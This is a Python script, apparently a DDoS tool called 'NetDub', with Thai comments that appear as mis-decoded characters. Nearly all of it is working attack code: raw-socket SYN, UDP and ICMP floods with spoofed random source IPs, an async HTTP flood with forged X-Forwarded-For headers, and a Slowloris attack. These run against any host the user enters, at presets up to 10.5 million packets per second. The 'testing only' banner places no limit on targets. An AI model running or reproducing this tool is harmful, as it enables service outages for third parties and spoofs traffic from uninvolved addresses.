#!/usr/bin/env python3
"""
NetDub - Advanced DDoS Testing Framework
‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢‡πÅ‡∏•‡∏∞‡∏û‡∏±‡∏í‡∏ô‡∏≤‡∏£‡∏∞‡∏ö‡∏ö‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô
‡∏ï‡πâ‡∏≠‡∏á‡∏£‡∏±‡∏ô‡πÉ‡∏ô‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå root ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î
"""

import os
import sys
import socket
import struct
import random
import time
import threading
import multiprocessing
import subprocess
import ctypes
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from scapy.all import *
import requests
import asyncio
import aiohttp
from colorama import Fore, Style, init

# ‡∏ï‡∏£‡∏ß‡∏à‡∏™‡∏≠‡∏ö‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå root
if os.geteuid() != 0:
    print(f"{Fore.RED}[!] ‡∏ï‡πâ‡∏≠‡∏á‡∏£‡∏±‡∏ô‡πÉ‡∏ô‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå root ‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô{Fore.RESET}")
    print(f"{Fore.YELLOW}[*] ‡∏£‡∏±‡∏ô‡∏î‡πâ‡∏ß‡∏¢: sudo python3 {sys.argv[0]}{Fore.RESET}")
    sys.exit(1)

init(autoreset=True)

class NetDubFramework:
    def __init__(self):
        self.target_host = None
        self.target_ip = None
        self.target_port = None
        self.attack_intensity = 1
        self.running = False
        self.stats = {
            'packets_sent': 0,
            'requests_sent': 0,
            'bytes_sent': 0,
            'connections_made': 0,
            'errors': 0
        }
        
        # ‡∏™‡∏£‡πâ‡∏≤‡∏á raw socket ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö packet crafting
        try:
            self.raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            self.raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except:
            print(f"{Fore.RED}[!] ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ‡∏™‡∏£‡πâ‡∏≤‡∏á raw socket ‡πÑ‡∏î‡πâ{Fore.RESET}")
    
    def banner(self):
        print(f"""
{Fore.CYAN}‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë                           NetDub                             ‚ïë
‚ïë                Advanced DDoS Testing Framework              ‚ïë
‚ïë                      Final Edition                          ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù{Fore.RESET}

{Fore.YELLOW}‚ö†Ô∏è  ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏Å‡∏≤‡∏£‡∏ó‡∏î‡∏™‡∏≠‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡∏õ‡∏•‡∏≠‡∏î‡∏†‡∏±‡∏¢‡πÅ‡∏•‡∏∞‡∏û‡∏±‡∏í‡∏ô‡∏≤‡∏£‡∏∞‡∏ö‡∏ö‡∏õ‡πâ‡∏≠‡∏á‡∏Å‡∏±‡∏ô‡πÄ‡∏ó‡πà‡∏≤‡∏ô‡∏±‡πâ‡∏ô ‚ö†Ô∏è{Fore.RESET}
{Fore.RED}üî• ‡∏ï‡πâ‡∏≠‡∏á‡πÉ‡∏ä‡πâ‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡πå root ‡∏™‡∏≥‡∏´‡∏£‡∏±‡∏ö‡∏õ‡∏£‡∏∞‡∏™‡∏¥‡∏ó‡∏ò‡∏¥‡∏†‡∏≤‡∏û‡∏™‡∏π‡∏á‡∏™‡∏∏‡∏î üî•{Fore.RESET}
""")
    
    def get_target_info(self):
        """‡∏£‡∏±‡∏ö‡∏Ç‡πâ‡∏≠‡∏°‡∏π‡∏•‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢"""
        print(f"{Fore.GREEN}[+] ‡∏Å‡∏≥‡∏´‡∏ô‡∏î‡πÄ‡∏õ‡πâ‡∏≤‡∏´‡∏°‡∏≤‡∏¢{Fore.RESET}")
        self.target_host = input(f"{Fore.CYAN}üåê Host/Domain: {Fore.RESET}").strip()
        self.target_port = int(input(f"{Fore.CYAN}üîå Port: {Fore.RESET}").strip())
        
        try:
            self.target_ip = socket.gethostbyname(self.target_host)
            print(f"{Fore.GREEN}[‚úì] Resolved: {self.target_host} -> {self.target_ip}{Fore.RESET}")
        except:
            print(f"{Fore.RED}[!] ‡πÑ‡∏°‡πà‡∏™‡∏≤‡∏°‡∏≤‡∏£‡∏ñ resolve domain ‡πÑ‡∏î‡πâ{Fore.RESET}")
            sys.exit(1)
    
    def select_intensity(self):
        """‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏£‡∏∞‡∏î‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏£‡∏á"""
        print(f"""
{Fore.YELLOW}[*] ‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏£‡∏∞‡∏î‡∏±‡∏ö‡∏Ñ‡∏ß‡∏≤‡∏°‡πÅ‡∏£‡∏á:{Fore.RESET}
{Fore.GREEN}1. ‡πÄ‡∏ö‡∏≤‡πÜ      - 100K pps{Fore.RESET}
{Fore.YELLOW}2. ‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á    - 500K pps{Fore.RESET}
{Fore.MAGENTA}3. ‡πÅ‡∏£‡∏á       - 1.2M pps{Fore.RESET}
{Fore.RED}4. ‡∏™‡∏∏‡∏î‡πÇ‡∏´‡∏î     - 5M pps{Fore.RESET}
{Fore.RED}5. ‡πÄ‡∏õ‡πá‡∏ô‡πÑ‡∏õ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ - 10.5M pps{Fore.RESET}
        """)
        
        choice = input(f"{Fore.CYAN}üéØ ‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏£‡∏∞‡∏î‡∏±‡∏ö (1-5): {Fore.RESET}").strip()
        
        intensity_map = {
            '1': {'name': '‡πÄ‡∏ö‡∏≤‡πÜ', 'pps': 100000, 'threads': 50, 'processes': 2},
            '2': {'name': '‡∏õ‡∏≤‡∏ô‡∏Å‡∏•‡∏≤‡∏á', 'pps': 500000, 'threads': 100, 'processes': 4},
            '3': {'name': '‡πÅ‡∏£‡∏á', 'pps': 1200000, 'threads': 200, 'processes': 8},
            '4': {'name': '‡∏™‡∏∏‡∏î‡πÇ‡∏´‡∏î', 'pps': 5000000, 'threads': 500, 'processes': 16},
            '5': {'name': '‡πÄ‡∏õ‡πá‡∏ô‡πÑ‡∏õ‡πÑ‡∏°‡πà‡πÑ‡∏î‡πâ', 'pps': 10500000, 'threads': 1000, 'processes': 32}
        }
        
        if choice in intensity_map:
            self.attack_config = intensity_map[choice]
            print(f"{Fore.GREEN}[‚úì] ‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡∏£‡∏∞‡∏î‡∏±‡∏ö: {self.attack_config['name']} - {self.attack_config['pps']:,} pps{Fore.RESET}")
        else:
            print(f"{Fore.RED}[!] ‡∏ï‡∏±‡∏ß‡πÄ‡∏•‡∏∑‡∏≠‡∏Å‡πÑ‡∏°‡πà‡∏ñ‡∏π‡∏Å‡∏ï‡πâ‡∏≠‡∏á{Fore.RESET}")
            sys.exit(1)
    
    def generate_fake_ip(self):
        """‡∏™‡∏£‡πâ‡∏≤‡∏á fake IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def create_ip_header(self, src_ip, dst_ip, protocol):
        """‡∏™‡∏£‡πâ‡∏≤‡∏á IP header"""
        version = 4
        ihl = 5
        tos = 0
        tot_len = 0
        ip_id = random.randint(1, 65535)
        frag_off = 0
        ttl = 64
        check = 0
        saddr = socket.inet_aton(src_ip)
        daddr = socket.inet_aton(dst_ip)
        
        ihl_version = (version << 4) + ihl
        header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, ip_id, frag_off, ttl, protocol, check, saddr, daddr)
        return header
    
    def create_tcp_header(self, src_port, dst_port, src_ip, dst_ip):
        """‡∏™‡∏£‡πâ‡∏≤‡∏á TCP header"""
        seq = random.randint(0, 4294967295)
        ack_seq = 0
        doff = 5
        
        # TCP flags
        fin = 0
        syn = 1
        rst = 0
        psh = 0
        ack = 0
        urg = 0
        
        flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
        window = socket.htons(5840)
        check = 0
        urg_ptr = 0
        
        offset_res = (doff << 4) + 0
        tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, check, urg_ptr)
        
        # Pseudo header for checksum
        src_addr = socket.inet_aton(src_ip)
        dst_addr = socket.inet_aton(dst_ip)
        placeholder = 0
        protocol = socket.IPPROTO_TCP
        tcp_length = len(tcp_header)
        
        psh = struct.pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol, tcp_length)
        psh = psh + tcp_header
        
        tcp_checksum = self.checksum(psh)
        tcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, flags, window, tcp_checksum, urg_ptr)
        
        return tcp_header
    
    def create_udp_header(self, src_port, dst_port, data):
        """‡∏™‡∏£‡πâ‡∏≤‡∏á UDP header"""
        length = 8 + len(data)
        checksum = 0
        header = struct.pack('!HHHH', src_port, dst_port, length, checksum)
        return header
    
    def checksum(self, data):
        """‡∏Ñ‡∏≥‡∏ô‡∏ß‡∏ì checksum"""
        if len(data) % 2:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]
        
        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum = ~checksum & 0xFFFF
        
        return checksum
    
    def syn_flood(self):
        """SYN Flood Attack - Layer 4"""
        while self.running:
            try:
                src_ip = self.generate_fake_ip()
                src_port = random.randint(1024, 65535)
                
                ip_header = self.create_ip_header(src_ip, self.target_ip, socket.IPPROTO_TCP)
                tcp_header = self.create_tcp_header(src_port, self.target_port, src_ip, self.target_ip)
                
                packet = ip_header + tcp_header
                self.raw_sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                self.stats['errors'] += 1
    
    def udp_flood(self):
        """UDP Flood Attack - Layer 4"""
        while self.running:
            try:
                src_ip = self.generate_fake_ip()
                src_port = random.randint(1024, 65535)
                
                # ‡∏™‡∏£‡πâ‡∏≤‡∏á random payload
                payload = os.urandom(random.randint(64, 1024))
                
                ip_header = self.create_ip_header(src_ip, self.target_ip, socket.IPPROTO_UDP)
                udp_header = self.create_udp_header(src_port, self.target_port, payload)
                
                packet = ip_header + udp_header + payload
                self.raw_sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                self.stats['errors'] += 1
    
    def icmp_flood(self):
        """ICMP Flood Attack - Layer 3"""
        while self.running:
            try:
                src_ip = self.generate_fake_ip()
                
                # ‡∏™‡∏£‡πâ‡∏≤‡∏á ICMP packet
                icmp_type = 8  # Echo Request
                icmp_code = 0
                icmp_checksum = 0
                icmp_id = random.randint(1, 65535)
                icmp_seq = random.randint(1, 65535)
                
                payload = os.urandom(56)  # Standard ping size
                
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                
                # Calculate checksum
                icmp_checksum = self.checksum(icmp_packet)
                icmp_header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
                icmp_packet = icmp_header + payload
                
                ip_header = self.create_ip_header(src_ip, self.target_ip, socket.IPPROTO_ICMP)
                packet = ip_header + icmp_packet
                
                self.raw_sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                
            except Exception as e:
                self.stats['errors'] += 1
    
    async def http_flood(self, session):
        """HTTP Flood Attack - Layer 7"""
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101",
        ]
        
        while self.running:
            try:
                url = f"http://{self.target_host}:{self.target_port}/?{random.randint(1, 999999)}"
                
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'max-age=0',
                    'X-Forwarded-For': self.generate_fake_ip(),
                    'X-Real-IP': self.generate_fake_ip(),
                }
                
                async with session.get(url, headers=headers, timeout=5) as response:
                    await response.read()
                    self.stats['requests_sent'] += 1
                    
            except Exception as e:
                self.stats['errors'] += 1
    
    def slowloris_attack(self):
        """Slowloris Attack - Layer 7"""
        sockets = []
        
        # ‡∏™‡∏£‡πâ‡∏≤‡∏á initial connections
        for _ in range(200):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target_ip, self.target_port))
                
                sock.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target_host}\r\n".encode())
                sock.send(f"User-Agent: Mozilla/5.0\r\n".encode())
                sock.send("Connection: keep-alive\r\n".encode())
                
                sockets.append(sock)
                self.stats['connections_made'] += 1
                
            except:
                self.stats['errors'] += 1
        
        # ‡∏™‡πà‡∏á headers ‡πÄ‡∏û‡∏∑‡πà‡∏≠ keep alive
        while self.running:
            for sock in sockets[:]:
                try:
                    sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                except:
                    sockets.remove(sock)
                    self.stats['errors'] += 1
            
            time.sleep(10)
    
    def launch_attack(self):
        """‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡πÅ‡∏ö‡∏ö‡∏´‡∏•‡∏≤‡∏¢‡∏ä‡∏±‡πâ‡∏ô"""
        print(f"{Fore.RED}[üî•] ‡πÄ‡∏£‡∏¥‡πà‡∏°‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ‡∏£‡∏∞‡∏î‡∏±‡∏ö: {self.attack_config['name']}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_host}:{self.target_port}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Threads: {self.attack_config['threads']}{Fore.RESET}")
        print(f"{Fore.YELLOW}[*] Processes: {self.attack_config['processes']}{Fore.RESET}")
        print(f"{Fore.RED}[*] ‡∏Å‡∏î Ctrl+C ‡πÄ‡∏û‡∏∑‡πà‡∏≠‡∏´‡∏¢‡∏∏‡∏î{Fore.RESET}")
        print()
        
        self.running = True
        
        # ‡πÄ‡∏£‡∏¥‡πà‡∏° Layer 4 attacks
        with ThreadPoolExecutor(max_workers=self.attack_config['threads']) as executor:
            # SYN Flood
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.syn_flood)
            
            # UDP Flood
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.udp_flood)
            
            # ICMP Flood
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.icmp_flood)
            
            # Slowloris
            for _ in range(self.attack_config['threads'] // 4):
                executor.submit(self.slowloris_attack)
        
        # ‡πÄ‡∏£‡∏¥‡πà‡∏° Layer 7 attacks
        asyncio.run(self.async_http_flood())
    
    async def async_http_flood(self):
        """Async HTTP Flood"""
        connector = aiohttp.TCPConnector(limit=1000, limit_per_host=100)
        timeout = aiohttp.ClientTimeout(total=5)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for _ in range(500):
                tasks.append(self.http_flood(session))
            
            await asyncio.gather(*tasks, return_exceptions=True)
    
    def monitor_stats(self):
        """‡πÅ‡∏™‡∏î‡∏á‡∏™‡∏ñ‡∏¥‡∏ï‡∏¥‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ"""
        start_time = time.time()
        
        while self.running:
            elapsed = time.time() - start_time
            pps = self.stats['packets_sent'] / elapsed if elapsed > 0 else 0
            rps = self.stats['requests_sent'] / elapsed if elapsed > 0 else 0
            
            print(f"\r{Fore.CYAN}[üìä] PPS: {pps:,.0f} | RPS: {rps:,.0f} | Packets: {self.stats['packets_sent']:,} | Errors: {self.stats['errors']:,}{Fore.RESET}", end='')
            
            time.sleep(1)
    
    def run(self):
        """‡∏£‡∏±‡∏ô‡πÇ‡∏õ‡∏£‡πÅ‡∏Å‡∏£‡∏°‡∏´‡∏•‡∏±‡∏Å"""
        self.banner()
        self.get_target_info()
        self.select_intensity()
        
        # ‡πÄ‡∏£‡∏¥‡πà‡∏° monitoring
        monitor_thread = threading.Thread(target=self.monitor_stats)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        try:
            self.launch_attack()
        except KeyboardInterrupt:
            print(f"\n{Fore.RED}[!] ‡∏´‡∏¢‡∏∏‡∏î‡∏Å‡∏≤‡∏£‡πÇ‡∏à‡∏°‡∏ï‡∏µ{Fore.RESET}")
            self.running = False
        finally:
            self.cleanup()
    
    def cleanup(self):
        """‡∏ó‡∏≥‡∏Ñ‡∏ß‡∏≤‡∏°‡∏™‡∏∞‡∏≠‡∏≤‡∏î"""
        self.running = False
        if hasattr(self, 'raw_sock'):
            self.raw_sock.close()
        
        print(f"\n{Fore.GREEN}[‚úì] ‡∏™‡∏ñ‡∏¥‡∏ï‡∏¥‡∏™‡∏∏‡∏î‡∏ó‡πâ‡∏≤‡∏¢:{Fore.RESET}")
        print(f"  Packets sent: {self.stats['packets_sent']:,}")
        print(f"  Requests sent: {self.stats['requests_sent']:,}")
        print(f"  Bytes sent: {self.stats['bytes_sent']:,}")
        print(f"  Connections made: {self.stats['connections_made']:,}")
        print(f"  Errors: {self.stats['errors']:,}")

if __name__ == "__main__":
    netdub = NetDubFramework()
    netdub.run()
